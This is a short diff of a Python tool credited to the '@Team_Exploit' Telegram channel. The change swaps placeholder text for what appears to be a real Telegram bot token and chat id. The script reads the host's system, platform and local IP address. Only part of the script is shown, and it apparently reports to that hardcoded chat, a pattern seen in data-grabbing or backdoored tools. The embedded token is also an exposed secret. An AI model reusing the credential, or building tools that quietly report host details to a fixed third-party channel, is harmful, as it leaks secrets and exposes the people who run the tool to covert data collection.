@@ -4,9 +4,8 @@
 # Broadcasting channel Telegram : @Team_Exploit
 # Tool Vip BotECS In channel : @KnightGuardian59
 
-token = ' Insert your bot token  '
-chat_id = 'Insert your account chat id ' 
-
+token = '6075328156:AAF-nqGXB7ZQlTVC2-TNtUZVXrTok7w_NK8 '
+chat_id = '-1002178360445' 
 from os import system
 from platform import (system,platform)
 import sys
@@ -17,7 +16,7 @@ from time import sleep; import socket
 from random import (choice, randint)
 from asyncio import run as ESNET
 from socket import socket, AF_INET, SOCK_DGRAM,SOCK_STREAM
-
+ 
 s = socket(AF_INET, SOCK_DGRAM)
 s.connect(("8.8.8.8", 87))
 typesys, systype = system(), platform()
